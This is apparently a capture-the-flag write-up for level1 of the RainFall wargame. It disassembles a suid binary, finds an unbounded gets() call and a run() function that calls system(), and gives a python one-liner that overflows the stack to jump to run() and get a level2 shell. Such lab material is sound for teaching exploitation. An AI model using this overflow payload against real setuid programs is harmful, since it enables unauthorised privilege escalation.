### Description

Like last exercice we found a binary in home with the suid  execution bit set so we will probably have exploit the binary to get access to the shell or to the pass through it

So we will disassemble the program using objdump to have it in full

```sh
level1@RainFall:~$ objdump -d ./level1 
```

We can find 2 interesting element

first there is an unprotected input in the main: `gets` will try to write a string of any length to the stack.

- We can exploit the stack by overwriting the return adress of the stack base pointer. 

- By scrolling through the program's function we notice a function name run that actually launch a call to `system` function

```as
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp

[...]

 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    
```

---

- running gdb we can observe the stack with:
`(gdb) x/100x $sp`


- We can also have information on stack frame with:
```as
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048495 in main; saved eip 0x64636261
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
```
- **Notice we got the current stack frame and the previous one in `saved eip 0x64636261`**



- We going to overwrite the return of main function to jump on the `run` function


```
level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
```
